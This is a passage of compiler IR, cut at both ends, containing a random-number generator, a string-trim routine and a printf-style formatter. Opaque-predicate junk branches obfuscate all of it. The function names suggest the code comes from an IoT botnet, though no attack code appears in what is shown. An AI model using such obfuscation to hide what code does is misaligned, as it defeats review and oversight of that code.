@x.71 = common global i32 0
@y.72 = common global i32 0
@x.73 = common global i32 0
@y.74 = common global i32 0
@x.75 = common global i32 0
@y.76 = common global i32 0
@x.77 = common global i32 0
@y.78 = common global i32 0
@x.79 = common global i32 0
@y.80 = common global i32 0
@x.81 = common global i32 0
@y.82 = common global i32 0
@x.83 = common global i32 0
@y.84 = common global i32 0

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = load i32, i32* @x
  %3 = load i32, i32* @y
  %4 = sub i32 %2, 1
  %5 = mul i32 %2, %4
  %6 = urem i32 %5, 2
  %7 = icmp eq i32 %6, 0
  %8 = icmp slt i32 %3, 10
  %9 = or i1 %7, %8
  br i1 %9, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %1
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i32 %0, i32* %10, align 4
  %12 = load i32, i32* %10, align 4
  store i32 %12, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %13 = load i32, i32* %10, align 4
  %14 = add i32 %13, -1640531527
  store i32 %14, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %15 = load i32, i32* %10, align 4
  %16 = add i32 %15, -1640531527
  %17 = add i32 %16, -1640531527
  store i32 %17, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %11, align 4
  %18 = load i32, i32* @x
  %19 = load i32, i32* @y
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %26

; <label>:26:                                     ; preds = %47, %originalBBpart2
  %27 = load i32, i32* %11, align 4
  %28 = icmp slt i32 %27, 4096
  br i1 %28, label %29, label %50

; <label>:29:                                     ; preds = %26
  %30 = load i32, i32* %11, align 4
  %31 = sub nsw i32 %30, 3
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %32
  %34 = load i32, i32* %33, align 4
  %35 = load i32, i32* %11, align 4
  %36 = sub nsw i32 %35, 2
  %37 = sext i32 %36 to i64
  %38 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %37
  %39 = load i32, i32* %38, align 4
  %40 = xor i32 %34, %39
  %41 = xor i32 %40, -1640531527
  %42 = load i32, i32* %11, align 4
  %43 = xor i32 %41, %42
  %44 = load i32, i32* %11, align 4
  %45 = sext i32 %44 to i64
  %46 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %45
  store i32 %43, i32* %46, align 4
  br label %47

; <label>:47:                                     ; preds = %29
  %48 = load i32, i32* %11, align 4
  %49 = add nsw i32 %48, 1
  store i32 %49, i32* %11, align 4
  br label %26

; <label>:50:                                     ; preds = %26
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %1
  %51 = alloca i32, align 4
  %52 = alloca i32, align 4
  store i32 %0, i32* %51, align 4
  %53 = load i32, i32* %51, align 4
  store i32 %53, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %54 = load i32, i32* %51, align 4
  %_ = shl i32 %54, -1640531527
  %55 = add i32 %54, -1640531527
  store i32 %55, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %56 = load i32, i32* %51, align 4
  %_1 = sub i32 0, %56
  %gen = add i32 %_1, -1640531527
  %_2 = sub i32 0, %56
  %gen3 = add i32 %_2, -1640531527
  %_4 = sub i32 %56, -1640531527
  %gen5 = mul i32 %_4, -1640531527
  %_6 = shl i32 %56, -1640531527
  %_7 = sub i32 %56, -1640531527
  %gen8 = mul i32 %_7, -1640531527
  %57 = add i32 %56, -1640531527
  %_9 = sub i32 0, %57
  %gen10 = add i32 %_9, -1640531527
  %_11 = shl i32 %57, -1640531527
  %_12 = sub i32 %57, -1640531527
  %gen13 = mul i32 %_12, -1640531527
  %_14 = sub i32 %57, -1640531527
  %gen15 = mul i32 %_14, -1640531527
  %_16 = sub i32 %57, -1640531527
  %gen17 = mul i32 %_16, -1640531527
  %58 = add i32 %57, -1640531527
  store i32 %58, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %52, align 4
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %1 = load i32, i32* @x.1
  %2 = load i32, i32* @y.2
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i64, align 8
  %10 = alloca i64, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  store i64 18782, i64* %10, align 8
  store i32 -2, i32* %12, align 4
  %13 = load i32, i32* @rand_cmwc.i, align 4
  %14 = add i32 %13, 1
  %15 = and i32 %14, 4095
  store i32 %15, i32* @rand_cmwc.i, align 4
  %16 = load i64, i64* %10, align 8
  %17 = load i32, i32* @rand_cmwc.i, align 4
  %18 = zext i32 %17 to i64
  %19 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %18
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = mul i64 %16, %21
  %23 = load i32, i32* @c, align 4
  %24 = zext i32 %23 to i64
  %25 = add i64 %22, %24
  store i64 %25, i64* %9, align 8
  %26 = load i64, i64* %9, align 8
  %27 = lshr i64 %26, 32
  %28 = trunc i64 %27 to i32
  store i32 %28, i32* @c, align 4
  %29 = load i64, i64* %9, align 8
  %30 = load i32, i32* @c, align 4
  %31 = zext i32 %30 to i64
  %32 = add i64 %29, %31
  %33 = trunc i64 %32 to i32
  store i32 %33, i32* %11, align 4
  %34 = load i32, i32* %11, align 4
  %35 = load i32, i32* @c, align 4
  %36 = icmp ult i32 %34, %35
  %37 = load i32, i32* @x.1
  %38 = load i32, i32* @y.2
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %36, label %45, label %50

; <label>:45:                                     ; preds = %originalBBpart2
  %46 = load i32, i32* %11, align 4
  %47 = add i32 %46, 1
  store i32 %47, i32* %11, align 4
  %48 = load i32, i32* @c, align 4
  %49 = add i32 %48, 1
  store i32 %49, i32* @c, align 4
  br label %50

; <label>:50:                                     ; preds = %45, %originalBBpart2
  %51 = load i32, i32* %12, align 4
  %52 = load i32, i32* %11, align 4
  %53 = sub i32 %51, %52
  %54 = load i32, i32* @rand_cmwc.i, align 4
  %55 = zext i32 %54 to i64
  %56 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %55
  store i32 %53, i32* %56, align 4
  ret i32 %53

originalBBalteredBB:                              ; preds = %originalBB, %0
  %57 = alloca i64, align 8
  %58 = alloca i64, align 8
  %59 = alloca i32, align 4
  %60 = alloca i32, align 4
  store i64 18782, i64* %58, align 8
  store i32 -2, i32* %60, align 4
  %61 = load i32, i32* @rand_cmwc.i, align 4
  %_ = shl i32 %61, 1
  %_1 = sub i32 %61, 1
  %gen = mul i32 %_1, 1
  %_2 = sub i32 0, %61
  %gen3 = add i32 %_2, 1
  %62 = add i32 %61, 1
  %_4 = sub i32 %62, 4095
  %gen5 = mul i32 %_4, 4095
  %_6 = shl i32 %62, 4095
  %63 = and i32 %62, 4095
  store i32 %63, i32* @rand_cmwc.i, align 4
  %64 = load i64, i64* %58, align 8
  %65 = load i32, i32* @rand_cmwc.i, align 4
  %66 = zext i32 %65 to i64
  %67 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %66
  %68 = load i32, i32* %67, align 4
  %69 = zext i32 %68 to i64
  %_7 = sub i64 %64, %69
  %gen8 = mul i64 %_7, %69
  %_9 = sub i64 0, %64
  %gen10 = add i64 %_9, %69
  %70 = mul i64 %64, %69
  %71 = load i32, i32* @c, align 4
  %72 = zext i32 %71 to i64
  %_11 = sub i64 %70, %72
  %gen12 = mul i64 %_11, %72
  %73 = add i64 %70, %72
  store i64 %73, i64* %57, align 8
  %74 = load i64, i64* %57, align 8
  %_13 = sub i64 %74, 32
  %gen14 = mul i64 %_13, 32
  %_15 = sub i64 %74, 32
  %gen16 = mul i64 %_15, 32
  %_17 = sub i64 0, %74
  %gen18 = add i64 %_17, 32
  %_19 = shl i64 %74, 32
  %_20 = shl i64 %74, 32
  %75 = lshr i64 %74, 32
  %76 = trunc i64 %75 to i32
  store i32 %76, i32* @c, align 4
  %77 = load i64, i64* %57, align 8
  %78 = load i32, i32* @c, align 4
  %79 = zext i32 %78 to i64
  %_21 = sub i64 0, %77
  %gen22 = add i64 %_21, %79
  %_23 = sub i64 %77, %79
  %gen24 = mul i64 %_23, %79
  %_25 = sub i64 %77, %79
  %gen26 = mul i64 %_25, %79
  %_27 = sub i64 %77, %79
  %gen28 = mul i64 %_27, %79
  %_29 = shl i64 %77, %79
  %_30 = sub i64 0, %77
  %gen31 = add i64 %_30, %79
  %80 = add i64 %77, %79
  %81 = trunc i64 %80 to i32
  store i32 %81, i32* %59, align 4
  %82 = load i32, i32* %59, align 4
  %83 = load i32, i32* @c, align 4
  %84 = icmp ult i32 %82, %83
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #10
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

; <label>:10:                                     ; preds = %19, %1
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #10
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %22

; <label>:19:                                     ; preds = %10
  %20 = load i32, i32* %4, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %4, align 4
  br label %10

; <label>:22:                                     ; preds = %10
  br label %23

; <label>:23:                                     ; preds = %38, %22
  %24 = load i32, i32* %5, align 4
  %25 = load i32, i32* %4, align 4
  %26 = icmp sge i32 %24, %25
  br i1 %26, label %27, label %36

; <label>:27:                                     ; preds = %23
  %28 = load i8*, i8** %2, align 8
  %29 = load i32, i32* %5, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = call i32 @isspace(i32 %33) #10
  %35 = icmp ne i32 %34, 0
  br label %36

; <label>:36:                                     ; preds = %27, %23
  %37 = phi i1 [ false, %23 ], [ %35, %27 ]
  br i1 %37, label %38, label %41

; <label>:38:                                     ; preds = %36
  %39 = load i32, i32* %5, align 4
  %40 = add nsw i32 %39, -1
  store i32 %40, i32* %5, align 4
  br label %23

; <label>:41:                                     ; preds = %36
  %42 = load i32, i32* %4, align 4
  store i32 %42, i32* %3, align 4
  br label %43

; <label>:43:                                     ; preds = %59, %41
  %44 = load i32, i32* %3, align 4
  %45 = load i32, i32* %5, align 4
  %46 = icmp sle i32 %44, %45
  br i1 %46, label %47, label %62

; <label>:47:                                     ; preds = %43
  %48 = load i8*, i8** %2, align 8
  %49 = load i32, i32* %3, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds i8, i8* %48, i64 %50
  %52 = load i8, i8* %51, align 1
  %53 = load i8*, i8** %2, align 8
  %54 = load i32, i32* %3, align 4
  %55 = load i32, i32* %4, align 4
  %56 = sub nsw i32 %54, %55
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %53, i64 %57
  store i8 %52, i8* %58, align 1
  br label %59

; <label>:59:                                     ; preds = %47
  %60 = load i32, i32* %3, align 4
  %61 = add nsw i32 %60, 1
  store i32 %61, i32* %3, align 4
  br label %43

; <label>:62:                                     ; preds = %43
  %63 = load i8*, i8** %2, align 8
  %64 = load i32, i32* %3, align 4
  %65 = load i32, i32* %4, align 4
  %66 = sub nsw i32 %64, %65
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8, i8* %63, i64 %67
  store i8 0, i8* %68, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #1

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8*, ...) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %5 = bitcast %struct.__va_list_tag* %4 to i8*
  call void @llvm.va_start(i8* %5)
  %6 = load i8*, i8** %2, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %8 = call i32 @print(i8** null, i8* %6, %struct.__va_list_tag* %7)
  ret i32 %8
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #2

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  br label %12

; <label>:12:                                     ; preds = %474, %3
  %13 = load i32, i32* @x.7
  %14 = load i32, i32* @y.8
  %15 = sub i32 %13, 1
  %16 = mul i32 %13, %15
  %17 = urem i32 %16, 2
  %18 = icmp eq i32 %17, 0
  %19 = icmp slt i32 %14, 10
  %20 = or i1 %18, %19
  br i1 %20, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %12
  %21 = load i8*, i8** %5, align 8
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 0
  %25 = load i32, i32* @x.7
  %26 = load i32, i32* @y.8
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %24, label %33, label %477

; <label>:33:                                     ; preds = %originalBBpart2
  %34 = load i8*, i8** %5, align 8
  %35 = load i8, i8* %34, align 1
  %36 = zext i8 %35 to i32
  %37 = icmp eq i32 %36, 37
  br i1 %37, label %38, label %433

; <label>:38:                                     ; preds = %33
  %39 = load i8*, i8** %5, align 8
  %40 = getelementptr inbounds i8, i8* %39, i32 1
  store i8* %40, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %41 = load i8*, i8** %5, align 8
  %42 = load i8, i8* %41, align 1
  %43 = zext i8 %42 to i32
  %44 = icmp eq i32 %43, 0
  br i1 %44, label %45, label %46

; <label>:45:                                     ; preds = %38
  br label %477

; <label>:46:                                     ; preds = %38
  %47 = load i8*, i8** %5, align 8
  %48 = load i8, i8* %47, align 1
  %49 = zext i8 %48 to i32
  %50 = icmp eq i32 %49, 37
  br i1 %50, label %51, label %52

; <label>:51:                                     ; preds = %46
  br label %450

; <label>:52:                                     ; preds = %46
  %53 = load i8*, i8** %5, align 8
  %54 = load i8, i8* %53, align 1
  %55 = zext i8 %54 to i32
  %56 = icmp eq i32 %55, 45
  br i1 %56, label %57, label %76

; <label>:57:                                     ; preds = %52
  %58 = load i32, i32* @x.7
  %59 = load i32, i32* @y.8
  %60 = sub i32 %58, 1
  %61 = mul i32 %58, %60
  %62 = urem i32 %61, 2
  %63 = icmp eq i32 %62, 0
  %64 = icmp slt i32 %59, 10
  %65 = or i1 %63, %64
  br i1 %65, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %57
  %66 = load i8*, i8** %5, align 8
  %67 = getelementptr inbounds i8, i8* %66, i32 1
  store i8* %67, i8** %5, align 8
  store i32 1, i32* %8, align 4
  %68 = load i32, i32* @x.7
  %69 = load i32, i32* @y.8
  %70 = sub i32 %68, 1
  %71 = mul i32 %68, %70
  %72 = urem i32 %71, 2
  %73 = icmp eq i32 %72, 0
  %74 = icmp slt i32 %69, 10
  %75 = or i1 %73, %74
  br i1 %75, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %76

; <label>:76:                                     ; preds = %originalBBpart24, %52
  %77 = load i32, i32* @x.7
  %78 = load i32, i32* @y.8
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %76
  %85 = load i32, i32* @x.7
  %86 = load i32, i32* @y.8
  %87 = sub i32 %85, 1
  %88 = mul i32 %85, %87
  %89 = urem i32 %88, 2
  %90 = icmp eq i32 %89, 0
  %91 = icmp slt i32 %86, 10
  %92 = or i1 %90, %91
  br i1 %92, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %93

; <label>:93:                                     ; preds = %98, %originalBBpart28
  %94 = load i8*, i8** %5, align 8
  %95 = load i8, i8* %94, align 1
  %96 = zext i8 %95 to i32
  %97 = icmp eq i32 %96, 48
  br i1 %97, label %98, label %103

; <label>:98:                                     ; preds = %93
  %99 = load i8*, i8** %5, align 8
  %100 = getelementptr inbounds i8, i8* %99, i32 1
  store i8* %100, i8** %5, align 8
  %101 = load i32, i32* %8, align 4
  %102 = or i32 %101, 2
  store i32 %102, i32* %8, align 4
  br label %93

; <label>:103:                                    ; preds = %93
  br label %104

; <label>:104:                                    ; preds = %125, %103
  %105 = load i8*, i8** %5, align 8
  %106 = load i8, i8* %105, align 1
  %107 = zext i8 %106 to i32
  %108 = icmp sge i32 %107, 48
  br i1 %108, label %109, label %114

; <label>:109:                                    ; preds = %104
  %110 = load i8*, i8** %5, align 8
  %111 = load i8, i8* %110, align 1
  %112 = zext i8 %111 to i32
  %113 = icmp sle i32 %112, 57
  br label %114

; <label>:114:                                    ; preds = %109, %104
  %115 = phi i1 [ false, %104 ], [ %113, %109 ]
  br i1 %115, label %116, label %128

; <label>:116:                                    ; preds = %114
  %117 = load i32, i32* %7, align 4
  %118 = mul nsw i32 %117, 10
  store i32 %118, i32* %7, align 4
  %119 = load i8*, i8** %5, align 8
  %120 = load i8, i8* %119, align 1
  %121 = zext i8 %120 to i32
  %122 = sub nsw i32 %121, 48
  %123 = load i32, i32* %7, align 4
  %124 = add nsw i32 %123, %122
  store i32 %124, i32* %7, align 4
  br label %125

; <label>:125:                                    ; preds = %116
  %126 = load i8*, i8** %5, align 8
  %127 = getelementptr inbounds i8, i8* %126, i32 1
  store i8* %127, i8** %5, align 8
  br label %104

; <label>:128:                                    ; preds = %114
  %129 = load i32, i32* @x.7
  %130 = load i32, i32* @y.8
  %131 = sub i32 %129, 1
  %132 = mul i32 %129, %131
  %133 = urem i32 %132, 2
  %134 = icmp eq i32 %133, 0
  %135 = icmp slt i32 %130, 10
  %136 = or i1 %134, %135
  br i1 %136, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %128
  %137 = load i8*, i8** %5, align 8
  %138 = load i8, i8* %137, align 1
  %139 = zext i8 %138 to i32
  %140 = icmp eq i32 %139, 115
  %141 = load i32, i32* @x.7
  %142 = load i32, i32* @y.8
  %143 = sub i32 %141, 1
  %144 = mul i32 %141, %143
  %145 = urem i32 %144, 2
  %146 = icmp eq i32 %145, 0
  %147 = icmp slt i32 %142, 10
  %148 = or i1 %146, %147
  br i1 %148, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %140, label %149, label %198

; <label>:149:                                    ; preds = %originalBBpart212
  %150 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %151 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %150, i32 0, i32 0
  %152 = load i32, i32* %151, align 8
  %153 = icmp ule i32 %152, 40
  br i1 %153, label %154, label %160

; <label>:154:                                    ; preds = %149
  %155 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %150, i32 0, i32 3
  %156 = load i8*, i8** %155, align 8
  %157 = getelementptr i8, i8* %156, i32 %152
  %158 = bitcast i8* %157 to i64*
  %159 = add i32 %152, 8
  store i32 %159, i32* %151, align 8
  br label %181

; <label>:160:                                    ; preds = %149
  %161 = load i32, i32* @x.7
  %162 = load i32, i32* @y.8
  %163 = sub i32 %161, 1
  %164 = mul i32 %161, %163
  %165 = urem i32 %164, 2
  %166 = icmp eq i32 %165, 0
  %167 = icmp slt i32 %162, 10
  %168 = or i1 %166, %167
  br i1 %168, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %160
  %169 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %150, i32 0, i32 2
  %170 = load i8*, i8** %169, align 8
  %171 = bitcast i8* %170 to i64*
  %172 = getelementptr i8, i8* %170, i32 8
  store i8* %172, i8** %169, align 8
  %173 = load i32, i32* @x.7
  %174 = load i32, i32* @y.8
  %175 = sub i32 %173, 1
  %176 = mul i32 %173, %175
  %177 = urem i32 %176, 2
  %178 = icmp eq i32 %177, 0
  %179 = icmp slt i32 %174, 10
  %180 = or i1 %178, %179
  br i1 %180, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %181

; <label>:181:                                    ; preds = %originalBBpart216, %154
  %182 = phi i64* [ %158, %154 ], [ %171, %originalBBpart216 ]
  %183 = load i64, i64* %182, align 8
  %184 = inttoptr i64 %183 to i8*
  store i8* %184, i8** %11, align 8
  %185 = load i8**, i8*** %4, align 8
  %186 = load i8*, i8** %11, align 8
  %187 = icmp ne i8* %186, null
  br i1 %187, label %188, label %190

; <label>:188:                                    ; preds = %181
  %189 = load i8*, i8** %11, align 8
  br label %191

; <label>:190:                                    ; preds = %181
  br label %191

; <label>:191:                                    ; preds = %190, %188
  %192 = phi i8* [ %189, %188 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.147, i32 0, i32 0), %190 ]
  %193 = load i32, i32* %7, align 4
  %194 = load i32, i32* %8, align 4
  %195 = call i32 @prints(i8** %185, i8* %192, i32 %193, i32 %194)
  %196 = load i32, i32* %9, align 4
  %197 = add nsw i32 %196, %195
  store i32 %197, i32* %9, align 4
  br label %474

; <label>:198:                                    ; preds = %originalBBpart212
  %199 = load i8*, i8** %5, align 8
  %200 = load i8, i8* %199, align 1
  %201 = zext i8 %200 to i32
  %202 = icmp eq i32 %201, 100
  br i1 %202, label %203, label %244

; <label>:203:                                    ; preds = %198
  %204 = load i8**, i8*** %4, align 8
  %205 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %206 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %205, i32 0, i32 0
  %207 = load i32, i32* %206, align 8
  %208 = icmp ule i32 %207, 40
  br i1 %208, label %209, label %215

; <label>:209:                                    ; preds = %203
  %210 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %205, i32 0, i32 3
  %211 = load i8*, i8** %210, align 8
  %212 = getelementptr i8, i8* %211, i32 %207
  %213 = bitcast i8* %212 to i32*
  %214 = add i32 %207, 8
  store i32 %214, i32* %206, align 8
  br label %236

; <label>:215:                                    ; preds = %203
  %216 = load i32, i32* @x.7
  %217 = load i32, i32* @y.8
  %218 = sub i32 %216, 1
  %219 = mul i32 %216, %218
  %220 = urem i32 %219, 2
  %221 = icmp eq i32 %220, 0
  %222 = icmp slt i32 %217, 10
  %223 = or i1 %221, %222
  br i1 %223, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %215
  %224 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %205, i32 0, i32 2
  %225 = load i8*, i8** %224, align 8
  %226 = bitcast i8* %225 to i32*
  %227 = getelementptr i8, i8* %225, i32 8
  store i8* %227, i8** %224, align 8
  %228 = load i32, i32* @x.7
  %229 = load i32, i32* @y.8
  %230 = sub i32 %228, 1
  %231 = mul i32 %228, %230
  %232 = urem i32 %231, 2
  %233 = icmp eq i32 %232, 0
  %234 = icmp slt i32 %229, 10
  %235 = or i1 %233, %234
  br i1 %235, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br label %236

; <label>:236:                                    ; preds = %originalBBpart220, %209
  %237 = phi i32* [ %213, %209 ], [ %226, %originalBBpart220 ]
  %238 = load i32, i32* %237, align 4
  %239 = load i32, i32* %7, align 4
  %240 = load i32, i32* %8, align 4
  %241 = call i32 @printi(i8** %204, i32 %238, i32 10, i32 1, i32 %239, i32 %240, i32 97)
  %242 = load i32, i32* %9, align 4
  %243 = add nsw i32 %242, %241
  store i32 %243, i32* %9, align 4
  br label %474

; <label>:244:                                    ; preds = %198
  %245 = load i8*, i8** %5, align 8
  %246 = load i8, i8* %245, align 1
  %247 = zext i8 %246 to i32
  %248 = icmp eq i32 %247, 120
  br i1 %248, label %249, label %306

; <label>:249:                                    ; preds = %244
  %250 = load i32, i32* @x.7
  %251 = load i32, i32* @y.8
  %252 = sub i32 %250, 1
  %253 = mul i32 %250, %252
  %254 = urem i32 %253, 2
  %255 = icmp eq i32 %254, 0
  %256 = icmp slt i32 %251, 10
  %257 = or i1 %255, %256
  br i1 %257, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %249
  %258 = load i8**, i8*** %4, align 8
  %259 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %260 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %259, i32 0, i32 0
  %261 = load i32, i32* %260, align 8
  %262 = icmp ule i32 %261, 40
  %263 = load i32, i32* @x.7
  %264 = load i32, i32* @y.8
  %265 = sub i32 %263, 1
  %266 = mul i32 %263, %265
  %267 = urem i32 %266, 2
  %268 = icmp eq i32 %267, 0
  %269 = icmp slt i32 %264, 10
  %270 = or i1 %268, %269
  br i1 %270, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %262, label %271, label %277

; <label>:271:                                    ; preds = %originalBBpart224
  %272 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %259, i32 0, i32 3
  %273 = load i8*, i8** %272, align 8
  %274 = getelementptr i8, i8* %273, i32 %261
  %275 = bitcast i8* %274 to i32*
  %276 = add i32 %261, 8
  store i32 %276, i32* %260, align 8
  br label %282

; <label>:277:                                    ; preds = %originalBBpart224
  %278 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %259, i32 0, i32 2
  %279 = load i8*, i8** %278, align 8
  %280 = bitcast i8* %279 to i32*
  %281 = getelementptr i8, i8* %279, i32 8
  store i8* %281, i8** %278, align 8
  br label %282

; <label>:282:                                    ; preds = %277, %271
  %283 = phi i32* [ %275, %271 ], [ %280, %277 ]
  %284 = load i32, i32* @x.7
  %285 = load i32, i32* @y.8
  %286 = sub i32 %284, 1
  %287 = mul i32 %284, %286
  %288 = urem i32 %287, 2
  %289 = icmp eq i32 %288, 0
  %290 = icmp slt i32 %285, 10
  %291 = or i1 %289, %290
  br i1 %291, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %282
  %292 = load i32, i32* %283, align 4
  %293 = load i32, i32* %7, align 4
  %294 = load i32, i32* %8, align 4
  %295 = call i32 @printi(i8** %258, i32 %292, i32 16, i32 0, i32 %293, i32 %294, i32 97)
  %296 = load i32, i32* %9, align 4
  %297 = add nsw i32 %296, %295
  store i32 %297, i32* %9, align 4
  %298 = load i32, i32* @x.7
  %299 = load i32, i32* @y.8
  %300 = sub i32 %298, 1
  %301 = mul i32 %298, %300
  %302 = urem i32 %301, 2
  %303 = icmp eq i32 %302, 0
  %304 = icmp slt i32 %299, 10
  %305 = or i1 %303, %304
  br i1 %305, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %474

; <label>:306:                                    ; preds = %244
  %307 = load i8*, i8** %5, align 8
  %308 = load i8, i8* %307, align 1
  %309 = zext i8 %308 to i32
  %310 = icmp eq i32 %309, 88
